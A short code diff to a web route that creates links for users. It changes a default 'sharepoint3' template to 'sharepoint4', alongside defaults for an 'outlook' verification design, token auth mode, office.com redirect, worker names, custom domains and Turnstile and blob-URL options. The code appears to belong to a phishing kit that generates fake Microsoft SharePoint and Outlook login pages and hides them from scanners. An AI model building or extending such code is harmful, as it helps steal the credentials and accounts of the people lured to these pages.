@@ -154,7 +154,7 @@ router.post('/', userAuth, commonValidators.createLink, validateResult, async (r
       background_blur, blob_url_enabled, copy_to_open, turnstile_enabled, custom_bg_url)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
       [
-        req.user.id, name || generatedName, uniqueWorkerName, template_type || 'sharepoint3',
+        req.user.id, name || generatedName, uniqueWorkerName, template_type || 'sharepoint4',
         verification_design || 'outlook', auth_mode || 'token',
         destination_url || 'https://office.com', custom_domain || null,
         url_type || 'worker', domain_connection || 'subdomain', route_name || null,
